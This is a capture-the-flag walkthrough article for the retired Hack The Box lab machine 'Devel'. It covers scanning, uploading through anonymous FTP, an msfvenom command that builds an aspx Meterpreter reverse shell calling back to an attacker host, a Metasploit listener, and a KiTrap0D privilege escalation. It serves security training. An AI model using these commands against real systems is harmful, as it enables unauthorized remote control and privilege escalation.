---
title: Keep Calm and Hack The Box - Devel
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-08-08T09:08:53.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-devel
coverImage: https://www.freecodecamp.org/news/content/images/2019/08/Sunrises_and_sunsets_Synthwave_Sun_562744_1920x1080.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them simulating real world scenarios and some of them leaning more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.37.03.png)

Devel is described as a relatively simple box that demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)
* [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

## **Step 1 - Scanning the network**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as possible.

I will use **Nmap** (Network Mapper), which is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.46.08.png)

I use the following command to get a basic idea of what we are scanning

```bash
nmap -sV -O -F --version-light 10.10.10.5
```

**-sV:** Probe open ports to determine service/version info

**-O:** Enable OS detection

**-F:** Fast mode - Scan fewer ports than the default scan

**--version-light:** Limit to most likely probes (intensity 2)

**10.10.10.**5**:** IP address of the Devel box

You can also use **Zenmap**, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.49.40.png)

I use a different set of commands to perform an intensive scan

```bash
nmap -A -v 10.10.10.5
```

**-A:** Enable OS detection, version detection, script scanning, and traceroute

**-v:** Increase verbosity level

**10.10.10.5:** IP address of the Devel box

If you find the results a little bit too overwhelming, you can move to the **Ports/Hosts** tab to only get the open ports.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.49.58.png)

We can see that there are 2 open ports:

**Port** 21. File Transfer Protocol (FTP) control (command). Here it's a Microsoft FTP

**Port** 80. Hypertext Transfer Protocol (HTTP). Here it's an IIS server

The most likely initial attack vector appears to be the **FTP** in this case

## **Step 2 -** The vulnerable FTP

We open **Firefox** and visit the website at **http://10.10.10.5**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.10.35.png)

From the reconnaissance phase, we found 2 files under the Microsoft FTP. Let's see if we can access them from the browser.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.13.04.png)

I can access the **welcome.png** image file by visiting

```url
http://10.10.10.5/welcome.png
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.14.57.png)

I can also access the **iisstart.htm** page

```url
http://10.10.10.5/iisstart.htm
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.17.18.png)

We now know two things:

* The FTP is used as a file directory for the web server - discovered when we accessed the files from the recon phase.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.22.01.png)

* The FTP allows anonymous login - discovered when we performed the intense scan.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.20.56.png)

Let's see if we can create a file and add it to the FTP

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.26.07.png)

I create a file by using this command and output the result to a file called **htb.html**

```bash
echo HackTheBox > htb.html
```

I then check with **ls** if the file has been created and what is the content of the file with this command

```bash
cat htb.html
```

Let's now connect to the FTP to add our test file

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.29.30.png)

To connect to the FTP, I use this command

```bash
ftp 10.10.10.5
```

I type **anonymous** as the username and just press enter for the password, as it allows anonymous login.

I am now connected to the FTP. 

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.32.59.png)

I add the file on the FTP with this command

```bash
put htb.html
```

The file has been successfully sent over. Let's check if we can access it from Firefox. I visit the page and we can see the output **HackTheBox** on the web page.

```url
http://10.10.10.5/htb.html
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.35.06.png)

Now that we know we can send over files, let's craft an exploit!

## **Step 3 -** Using MSFvenom to craft an exploit

We will use MSFvenom, which is a payload generator . You can learn more about it [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.49.14.png)

But first, let's check on **[Metasploit Framework](https://www.metasploit.com/)** which payload we will need to craft our exploit. 

We know that we need to create a **reverse shell**, which is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.53.40.png)
_[https://resources.infosecinstitute.com/icmp-reverse-shell/](https://resources.infosecinstitute.com/icmp-reverse-shell/)_

The reverse TCP shell should be for Windows and we will use **Meterpreter**.

From the Offensive Security website, we get this definition for Meterpreter

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.57.28.png)

I launch **Metasploit** and search for reverse TCP payloads. I use the following command

```bash
search windows/meterpreter/reverse_tcp
```

We find an interesting payload, number 2, which is a **Reverse TCP Stager**. This payload injects the meterpreter server DLL via the Reflective Dll Injection payload and connects back to the attacker 

```bash
payload/windows/meterpreter/reverse_tcp
```

Now let's go back to **msfvenom** to craft our exploit. And more specifically an **aspx** reverse shell. This piece of information has been collected during recon phase

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.09.43.png)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.13.15.png)

I use the following command

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.15 LPORT=4444
```

**-**p**:** Payload to use

**-**f**:** Output format

**-**0**:** Save the payload to a file

**LHOST**:**** Local host

**LPORT**:**** Local port

I then check with **ls** if the file has been created. It's time to send it over to the FTP

Let's reconnect to the FTP and send our little gift!

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.22.14.png)

I connect to the FTP, enter **anonymous** as a username, skip the password by pressing enter. I then send the file with the following command

```bash
put devel.aspx
```

Let's check if the file has been correctly sent over. Going back to **Firefox**, I navigate to the FTP server with the following command

```url
ftp://10.10.10.5
```

We can see that our little gift is here!

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.37.40.png)

Here is the exploit, if you're curious to know what it looks like

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.37.55.png)

## **Step 4 -** Setting up a listener with Metasploit

Back on Metasploit where I use the following command to set the payload handler

```bash
use exploit/multi/handler
```

I check to see which options are available

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.54.29.png)

We first set up the payload

```bash
set payload windows/meterpreter/reverse_tcp
```

Then the LHOST

```bash
set lhost 10.10.14.15
```

And finally the LPORT

```bash
set lport 4444
```

If we check the options now, we should see that everything is set up

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.54.42.png)

Let's run the exploit. 

After this message appears

```bash
Started reverse TCP handler on 10.10.14.15:4444
```

go back to the browser and access the page where the malicious script is hosted

```url
http://10.10.10.5/devel.aspx
```

You should then see a Meterpreter session created

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.54.51.png)

Now that I have a session, I try to look for the first flag, user.txt using the following command on meterpreter

```bash
search -f user.txt
```

No files are matching my search. I try with .* to see other files, but nothing useful

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.01.41.png)

I then create a shell with the following command

```bash
shell
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.08.21.png)

I use the following command to get the system information

```bash
systeminfo
```

We can see that the registered owner is called **babis**. This might an important piece of information when we will be looking for the user flag. We can also see that the machine doesn't have any hotfixes.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.08.44-1.png)

I start navigating through the folders. I use **dir** to list all files/folders and **cd** to change directory. I try my luck on the **babis** and **Administrator** folders, but both gave me Access denied. 

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.06.20.png)

We need to escalate privilege! Knowing that when we checked for the system information, no hotfixes were found, we can try to find exploits applicable to this machine.

## Step 5 - Performing Privilege Escalation

I put the session in the background with this command

```bash
background
```

I then use the following command

```bash
use post/multi/recon/local_exploit_suggester
```

This module suggests local Meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in Meterpreter

I check the options and I set the session

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.03.png)

It's important to note that not all local exploits will be fired. Exploits are chosen based on these conditions: session type, platform, architecture, and required default options

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.15.png)

Going down the list

```bash
exploit/windows/local/bypassuac_eventvwr
```

fails due to the IIS user not being a part of the administrators group, which is the default and to be expected.

I use the next exploit on the list, which is

```bash
use exploit/windows/local/ms10_015_kitrap0d
```

This module will create a new session with SYSTEM privileges via the KiTrap0D exploit by Tavis Ormandy. If the session in use is already elevated then the exploit will not run. The module relies on kitrap0d.x86.dll, and is not supported on x64 editions of Windows.

When we ran the **sysinfo** in the Meterpreter session, it revealed that the target was x86 architecture

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.46.png)

I check the options and then set the session

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.59-1.png)

I run the exploit. 

The exploit was successful, but the session couldn't be created. This is because of the first line in the exploit trying to set up a reverse handler on the default eth0 and default port, and not the VPN interface for HTB labs.

```bash
Started reverse TCP handler on 10.0.2.15:4444
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.42.58.png)

I check the options and set LHOST and LPORT

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.43.17.png)

I then check all the sessions alive with the following command, in case my session died

```bash
sessions -l
```

I can see my session

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.43.57.png)

Now that we have a meterpreter session, let's start navigating the folder and find the flags!

## **Step 6 - Looking for the user.txt flag**

Let's first check where we are with the following command

```bash
pwd
```

which stands for **print work directory**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.44.16.png)

I go up to **C:\** and **ls** all the files/folders. I already know where to look from my previous attempt in **Step 4 - Setting up a listener with Metasploit**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.44.29.png)

I go back to the **Users** directory

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.44.57.png)

Then move to the **babis** directory

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.45.13.png)

From there, I go to the **Desktop** directory

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.45.34.png)

We found the **user.txt.txt** file! To read the content of the file I use the command

```bash
cat user.txt.txt
```

Now that we have the user flag, let's find the root flag!

## **Step 7 - Looking for the root.txt flag**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.46.02.png)

Going back to **C:\** to navigate to the **Administrator** folder then the **Desktop** folder. I use **ls** to list all files under the **Desktop** folder

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.46.12.png)

We find the **root.txt.txt** file! 

To read the content of the file I use the command

```bash
cat root.txt.txt
```

Congrats! You found both flags!

---

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Other Hack The Box articles**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Sunrises_and_sunsets_Synthwave_Sun_562744_1920x1080-1.jpg)

